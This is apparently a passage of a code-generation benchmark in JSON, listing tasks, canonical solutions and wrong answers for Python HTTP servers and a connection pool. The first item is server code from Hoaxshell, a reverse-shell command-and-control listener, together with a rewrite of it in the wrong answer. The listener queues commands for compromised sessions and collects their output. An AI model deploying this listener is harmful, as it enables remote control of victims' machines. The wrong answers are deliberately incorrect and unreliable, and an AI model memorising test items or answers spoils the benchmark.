{ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')\n\n            except IndexError:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'\n                Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')\n\n            try:\n                Thread(target=self.monitor_shell_state, args=(session_id,), name=f'session_state_monitor_{self.client_address[0]}', daemon=True).start()\n            except:\n                pass\n\n            new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])\n            new_session_data['session_id'] = session_id\n            new_session_data['alias'] = None\n            new_session_data['aliased'] = False\n            new_session_data['self_owned'] = False\n            Core_Server.announce_new_session(new_session_data)\n            del new_session_data\n\n        elif self.path.strip(\"/\") in Sessions_Manager.get_cmd and legit:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n\n            if len(self.command_pool[session_id]):\n                cmd = self.command_pool[session_id].pop(0)\n                if isinstance(cmd, dict):\n                    cmd = cmd['data']\n                self.wfile.write(bytes(cmd, 'utf-8'))\n            else:\n                self.wfile.write(bytes('None', 'utf-8'))\n\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n            return\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'')\n\n    def do_POST(self):\n        timestamp = int(datetime.now().timestamp())\n        session_id = self.headers.get(self.header_id)\n        legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False\n\n        if legit:\n            try:\n                Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n                self.server_version = Hoaxshell_Settings.server_version\n                self.sys_version = \"\"\n\n                if self.path.strip(\"/\") in Sessions_Manager.post_res and legit and \\\n                   session_id in Sessions_Manager.active_sessions.keys():\n                    \n                    try:\n                        self.send_response(200)\n                        self.send_header('Content-Type', 'text/plain')\n                        self.end_headers()\n                        self.wfile.write(b'OK')\n                        content_len = int(self.headers.get('Content-Length'))\n                        output = None\n                        output = self.rfile.read(content_len)\n                        output = self.cmd_output_interpreter(session_id, output, constraint_mode=Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])\n                        \n                        if not isinstance(output, int):\n                            if isinstance(output, str):\n                                if re.search(\"The term 'OK' is not recognized as the name of a cmdlet, function, script file\", output) or re.search('bash: line 1: OK: command not found', output):\n                                    return\n                                print(f'\\r{GREEN}{output}{END}') if output else do_nothing()\n                                print()\n                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                            elif isinstance(output, list):\n                                if not isinstance(output[1], int):\n                                    try:\n                                        Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)\n                                    except:\n                                        pass\n\n                    except ConnectionResetError:\n                        error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get(\"Content-Length\")}). Try limiting the command\\'s output.'\n                        if isinstance(output, str):\n                            print(error_msg)\n                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                        elif isinstance(output, list):\n                            try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)\n                            except: pass\n                        del error_msg\n\n                    finally:\n                        del output\n\n            except KeyError:\n                pass\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Move on mate.')\n\n    def do_OPTIONS(self):\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', self.headers[\"Origin\"])\n        self.send_header('Vary', \"Origin\")\n        self.send_header('Access-Control-Allow-Credentials', 'true')\n        self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\n    def log_message(self, format, *args):\n        return\n\ndef initiate_hoax_server():\n    try:\n        if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \\\n           (Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):\n            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')\n\n        port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl\n\n        try:\n            httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)\n        except OSError:\n            exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\\n')\n        except:\n            exit(f'\\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\\n')\n\n        if Hoaxshell_Settings.ssl_support:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n            context.load_cert_chain(certfile=Hoaxshell_Settings.certfile, keyfile=Hoaxshell_Settings.keyfile)\n            httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)\n\n        Hoaxshell_server = Thread(target=httpd.serve_forever, args=(), name='hoaxshell_server')\n        Hoaxshell_server.daemon = True\n        Hoaxshell_server.start()\n        registered_services.append({\n            'service': Hoaxshell.server_name,\n            'socket': f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'\n        })\n        print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')\n\n    except KeyboardInterrupt:\n        Hoaxshell.terminate()\n```",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport ssl\nimport json\nimport threading\nimport logging\nfrom urllib.parse import urlparse, parse_qs\nfrom functools import wraps\n\nclass Hoaxshell(http.server.BaseHTTPRequestHandler):\n    server_name = \"HoaxShell Server\"\n    header_id = \"X-Hoax-Session-ID\"\n    server_unique_id = \"UNIQUE_SERVER_ID_12345\"\n    command_pool = {}\n\n    def log_message(self, format, *args):\n        pass  # Suppress default logging\n\n    def do_GET(self):\n        parsed_path = urlparse(self.path)\n        query_params = parse_qs(parsed_path.query)\n\n        session_id = self.headers.get(self.header_id)\n        if not session_id:\n            self.send_error(400, \"Missing session ID\")\n            return\n\n        if session_id not in self.command_pool:\n            self.send_response(204)\n            self.end_headers()\n            return\n\n        command = self.command_pool[session_id].pop(0)\n        if not self.command_pool[session_id]:\n            del self.command_pool[session_id]\n\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", self.header_id)\n        self.end_headers()\n\n        response = {\"command\": command}\n        self.wfile.write(json.dumps(response).encode())\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        try:\n            data = json.loads(post_data)\n        except json.JSONDecodeError:\n            self.send_error(400, \"Invalid JSON\")\n            return\n\n        session_id = self.headers.get(self.header_id)\n        if not session_id:\n            self.send_error(400, \"Missing session ID\")\n            return\n\n        output = data.get(\"output\")\n        if output is None:\n            self.send_error(400, \"No output provided\")\n            return\n\n        self.send_response(200)\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", self.header_id)\n        self.end_headers()\n\n        print(f\"[{session_id}] Output: {output}\")\n\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", self.header_id)\n        self.end_headers()\n\n    @staticmethod\n    def initiate_hoax_server(host=\"0.0.0.0\", port=8080, https=False, certfile=None, keyfile=None):\n        class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):\n            pass\n\n        server_address = (host, port)\n        httpd = ThreadedHTTPServer(server_address, Hoaxshell)\n\n        if https and certfile and keyfile:\n            httpd.socket = ssl.wrap_socket(\n                httpd.socket,\n                keyfile=keyfile,\n                certfile=certfile,\n                server_side=True\n            )\n\n        print(f\"Serving on {host}:{port} with HTTPS={https}\")\n        httpd.serve_forever()\n\ndef add_session_command(session_id, command):\n    Hoaxshell.command_pool[session_id] = Hoaxshell.command_pool.get(session_id, []) + [command]\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for resolving secret hashes to their corresponding secrets, specifically designed for XUD (Cross-chain Unidirectional Payment Channel) resolution.\n\nClass Description: The XUDResolver class is an HTTP server that handles POST requests containing secret hashes and responds with the corresponding secret if the hash matches a predefined secret. It uses Python's http.server module to create a simple HTTP server.\n\nAttributes:\n- host: str - The host address where the server will run (default: \"localhost\")\n- port: int - The port number for the server (default: 8000)\n- x_secret: str - A predefined secret in hexadecimal format\n- x_secret_hash: str - The SHA-256 hash of the predefined secret\n\nMethods:\n- __init__(host: str = \"localhost\", port: int = 8000) -> None - Initializes the XUDResolver with optional host and port parameters\n- resolve(request: dict) -> dict or None - Takes a request dictionary containing a \"secrethash\" and returns the corresponding secret if the hash matches, otherwise returns None\n- serve() -> None - Starts the HTTP server with a custom request handler that processes POST requests for secret resolution",
    "Canonical_solution": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom hashlib import sha256\nfrom eth_utils import to_bytes, to_hex\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x2ff886d47b156de00d4cad5d8c332706692b5b572adfe35e6d2f65e92906806e\"\n        self.x_secret_hash = to_hex(sha256(to_bytes(hexstr=self.x_secret)).digest())\n\n    def resolve(self, request):\n        if \"secrethash\" not in request:\n            return None\n\n        if request[\"secrethash\"] == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.resolver = kwargs.pop('resolver')\n                super().__init__(*args, **kwargs)\n\n            def do_POST(self):\n                try:\n                    content_len = int(self.headers.get(\"Content-Length\"))\n                    body = self.rfile.read(content_len)\n\n                    preimage = self.resolver.resolve(json.loads(body.decode(\"utf8\")))\n                    if preimage is None:\n                        self.send_response(404)\n                        self.end_headers()\n                    else:\n                        response = to_bytes(text=json.dumps(preimage))\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(response)\n                except BaseException:\n                    self.send_response(400)\n                    self.end_headers()\n\n        httpd = HTTPServer((self.host, self.port), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, resolver=self, **kwargs))\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport hashlib\nimport json\n\nclass XUDResolver:\n    def __init__(self, host: str = \"localhost\", port: int = 8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"deadbeef\" * 8\n        self.x_secret_hash = hashlib.sha256(bytes.fromhex(self.x_secret)).hexdigest()\n\n    def resolve(self, request: dict) -> dict or None:\n        secrethash = request.get(\"secrethash\")\n        if secrethash == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class ResolverRequestHandler(http.server.BaseHTTPRequestHandler):\n            resolver = self\n\n            def do_POST(self):\n                content_length = int(self.headers[\"Content-Length\"])\n                post_data = self.rfile.read(content_length)\n                request = json.loads(post_data.decode(\"utf-8\"))\n                result = self.resolver.resolve(request)\n                self.send_response(200)\n                self.send_header(\"Content-type\", \"application/json\")\n                self.end_headers()\n                self.wfile.write(json.dumps(result).encode(\"utf-8\"))\n\n        with socketserver.TCPServer((self.host, self.port), ResolverRequestHandler) as httpd:\n            print(f\"Serving on {self.host}:{self.port}\")\n            httpd.serve_forever()\n```"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server to serve static files and render dynamic content from a profile file, with optional browser auto-launch functionality.\n\nClass Description: ProfileHTTPServer is a class that creates and manages an HTTP server to serve both static files from a 'web' directory and dynamically rendered content from profile data. It handles port selection, profile data reading, and optional browser launching.\n\nAttributes:\nprof_filename: str - The filename of the profile to be read and served\nstart_browser: bool - Flag indicating whether to automatically open a browser tab\nport: Optional[int] - The port number to use for the server (None for auto-selection)\ndata: Any - The profile data read from the file\n\nMethods:\n__init__(prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None - Initializes the server with profile filename, browser flag, and optional port\n_read_profile() -> Any - Reads and returns profile data from the specified file\n_is_port_in_use(port: int) -> bool - Checks if a port is already in use\nstart() -> None - Starts the HTTP server on the selected port, optionally launching a browser\n\nStaticServer (nested class):\n__init__(data: Any, prof_filename: str, *args, **kwargs) -> None - Initializes the request handler with profile data and filename\ndo_GET() -> None - Handles GET requests, serving either static files or rendered HTML\n_render() -> str - Renders the HTML template with profile data and version information",
    "Canonical_solution": "import html\nimport json\nimport mimetypes\nimport socket\nimport threading\nimport webbrowser\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path\nfrom typing import Optional\n\nclass StaticServer(BaseHTTPRequestHandler):\n    def __init__(self, data, prof_filename, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        self.send_response(200)\n\n        if self.path == \"/\":\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(self._render().encode())\n        else:\n            this_dir = Path(__file__).resolve().parent\n            filepath = this_dir / \"web\" / self.path[1:]\n\n            mimetype, _ = mimetypes.guess_type(str(filepath))\n            assert mimetype is not None\n            self.send_header(\"Content-type\", mimetype)\n            self.end_headers()\n\n            with open(filepath, \"rb\") as fh:\n                content = fh.read()\n            self.wfile.write(content)\n\n    def _render(self):\n        this_dir = Path(__file__).resolve().parent\n        with open(this_dir / \"web\" / \"index.html\", encoding=\"utf-8\") as _file:\n            template = string.Template(_file.read())\n\n        return template.substitute(\n            data=html.escape(json.dumps(self.data).replace(\"</\", \"<\\\\/\")),\n            version=html.escape(__version__),\n            filename=html.escape(self.prof_filename.replace(\"</\", \"<\\\\/\")),\n        )\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self):\n        try:\n            return read_import_profile(self.prof_filename)\n        except (TunaError, StopIteration):\n            pass\n        return read_runtime_profile(self.prof_filename)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex((\"localhost\", port)) == 0\n\n    def start(self):\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        handler = lambda *args: StaticServer(self.data, self.prof_filename, *args)\n        httpd = HTTPServer((\"\", self.port), handler)\n\n        if self.start_browser:\n            address = f\"http://localhost:{self.port}\"\n            threading.Thread(target=lambda: webbrowser.open_new_tab(address)).start()\n\n        print(f\"Starting httpd on port {self.port}\")\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport os\nimport webbrowser\nimport socket\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\nfrom typing import Any, Optional\n\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None:\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self) -> Any:\n        with open(self.prof_filename, 'r') as f:\n            return f.read()\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex(('localhost', port)) == 0\n\n    def start(self) -> None:\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        server_address = ('', self.port)\n        handler_class = type('StaticServer', (SimpleHTTPRequestHandler,), {\n            '__init__': lambda self, *args, **kwargs: (\n                super().__init__(*args, **kwargs),\n                setattr(self, 'data', self.server.data),\n                setattr(self, 'prof_filename', self.server.prof_filename)\n            )[-1],\n            'do_GET': lambda self: (\n                path = self.path,\n                self.send_response(200),\n                self.send_header('Content-type', 'text/html'),\n                self.end_headers(),\n                self.wfile.write(self._render().encode()) if path == '/' else self.copyfile(\n                    open(os.path.join('web', path[1:] if path != '/' else 'index.html'), 'rb'),\n                    self.wfile\n                )\n            ),\n            '_render': lambda self: f\"\"\"\n            <html>\n                <head><title>Profile</title></head>\n                <body>\n                    <h1>Profile Data</h1>\n                    <pre>{self.data}</pre>\n                    <p>Loaded from: {self.prof_filename}</p>\n                    <p>Server version: Python HTTP Server</p>\n                </body>\n            </html>\n            \"\"\"\n        })\n\n        httpd = HTTPServer(server_address, handler_class)\n        httpd.data = self.data\n        httpd.prof_filename = self.prof_filename\n        print(f\"Serving on port {self.port}\")\n        if self.start_browser:\n            webbrowser.open(f'http://localhost:{self.port}')\n        httpd.serve_forever()\n```"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a custom HTTP server in Python that can serve content and be stopped after handling a single GET request.\n\nClass Description: This implementation consists of two classes: HttpRequestHandler (handles HTTP requests) and HttpServer (manages server operations). The server serves specified content when receiving a GET request and then stops itself.\n\nAttributes:\n\nAttribute1: stop [bool] - Flag indicating whether the server should stop running\nAttribute2: content [bytes] - The content to be served in response to GET requests\n\nMethods:\n\nMethod1: do_GET(self) -> None - Handles GET requests by sending a 200 response with the server's content and setting the stop flag\nMethod2: log_message(self, format, *args) -> None - Overrides default logging to suppress log messages\nMethod3: serve_forever(self, content) -> None - Starts the server with the given content and runs until a request is handled (stop flag is set)",
    "Canonical_solution": "import socket\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        return\n\nclass HttpServer(HTTPServer):\n    def serve_forever(self, content):\n        self.stop = False\n        self.content = content\n        while not self.stop:\n            self.handle_request()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\n\nclass HttpRequestHandler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        pass\n\n\nclass HttpServer(socketserver.TCPServer):\n    def __init__(self, server_address):\n        super().__init__(server_address, HttpRequestHandler)\n        self.stop = False\n        self.content = b\"\"\n\n    def serve_forever(self, content):\n        self.content = content\n        while not self.stop:\n            self.handle_request()\n```"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a simple HTTP server in Python that can handle GET, HEAD, and POST requests, with customizable port configuration.\n\nClass Description: SimpleHTTPServer is a class that implements a basic HTTP server capable of processing GET, HEAD, and POST requests. It includes an inner RequestHandler class that manages the actual request processing and response generation.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8080)\n- server_address: tuple - A tuple containing the server address and port (default: ('', port))\n- handler_class: class - The request handler class that processes HTTP requests\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the server with the specified port\n- run() -> None - Starts the HTTP server and begins serving requests indefinitely\n- RequestHandler._set_headers() -> None - Sets basic HTTP response headers (200 status and text/html content type)\n- RequestHandler.do_GET() -> None - Handles HTTP GET requests\n- RequestHandler.do_HEAD() -> None - Handles HTTP HEAD requests\n- RequestHandler.do_POST() -> None - Handles HTTP POST requests, reading and printing the posted data",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = self.RequestHandler\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._set_headers()\n            print(post_data)\n\n    def run(self):\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print('Starting httpd...')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\n\nclass SimpleHTTPServer:\n    class RequestHandler(http.server.BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n            self.wfile.write(b\"<html><body><h1>GET request received</h1></body></html>\")\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            print(f\"Received POST data: {post_data}\")\n            self._set_headers()\n            self.wfile.write(b\"<html><body><h1>POST request received</h1></body></html>\")\n\n    def __init__(self, port: int = 8080):\n        self.port = port\n        self.server_address = ('', port)\n        self.handler_class = SimpleHTTPServer.RequestHandler\n\n    def run(self):\n        with socketserver.TCPServer(self.server_address, self.handler_class) as httpd:\n            print(f\"Serving on port {self.port}\")\n            httpd.serve_forever()\n```"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, reducing the overhead of establishing new connections for each request.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that maintains a pool of connections to a specific host, allowing for connection reuse and efficient resource management.\n\nAttributes:\n- host: str - The target host for the connections\n- port: int | None - The target port (defaults to None for standard ports)\n- timeout: Timeout | float | None - Connection and read timeout settings\n- maxsize: int - Maximum number of connections in the pool (default 1)\n- block: bool - Whether to block when pool is full (default False)\n- headers: typing.Mapping[str, str] | None - Default headers for connections\n- retries: Retry | bool | int | None - Retry configuration for failed requests\n- proxy: Url | None - Proxy server configuration\n- proxy_headers: typing.Mapping[str, str] | None - Headers for proxy connections\n- pool: queue.LifoQueue - The connection pool storage\n- num_connections: int - Count of total connections created\n- num_requests: int - Count of total requests made\n- conn_kw: typing.Any - Additional connection parameters\n\nMethods:\n- __init__(host: str, port: int | None = None, timeout: Timeout | float | None = None, maxsize: int = 1, block: bool = False, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, _proxy: Url | None = None, _proxy_headers: typing.Mapping[str, str] | None = None, **conn_kw: typing.Any) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection\n- _get_conn(timeout: float | None = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: HTTPConnection | None) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = None, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, timeout: Timeout | float | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n- _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None - Static method to close all connections in a given pool",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Literal, TypeVar, Union, overload\nimport typing\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ReadTimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\n_SelfT = TypeVar(\"_SelfT\")\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host: str,\n        port: int | None = None,\n        timeout: Timeout | float | None = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        _proxy: Url | None = None,\n        _proxy_headers: typing.Mapping[str, str] | None = None,\n        **conn_kw: typing.Any,\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: float | None = None) -> HTTPConnection:\n        conn = None\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking mode is enabled.\")\n            pass\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: HTTPConnection | None) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        timeout: Timeout = None,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        try:\n            conn.request(method, url, body=body, headers=headers)\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseException) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        timeout: Timeout | float | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        if retries is None:\n            retries = self.retries\n        elif not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        conn = None\n        try:\n            conn = self._get_conn(timeout=timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout,\n                body=body,\n                headers=headers,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (ProtocolError, OSError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                timeout,\n                **response_kw,\n            )\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport queue\nimport threading\nfrom typing import Any, Mapping, Optional, Union\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.response import BaseHTTPResponse\nfrom urllib3.util import Timeout, Retry\n\n\nclass HTTPConnectionPool:\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        timeout: Optional[Union[Timeout, float]] = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Union[Retry, bool, int]] = None,\n        _proxy: Any = None,\n        _proxy_headers: Optional[Mapping[str, str]] = None,\n        **conn_kw: Any\n    ) -> None:\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.maxsize = maxsize\n        self.block = block\n        self.headers = headers\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        return HTTPConnection(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout: Optional[float] = None) -> HTTPConnection:\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn: Optional[HTTPConnection]) -> None:\n        if conn and self.pool.qsize() < self.maxsize:\n            self.pool.put(conn)\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        timeout: Optional[Timeout] = None,\n        body: Any = None,\n        headers: Optional[Mapping[str, str]] = 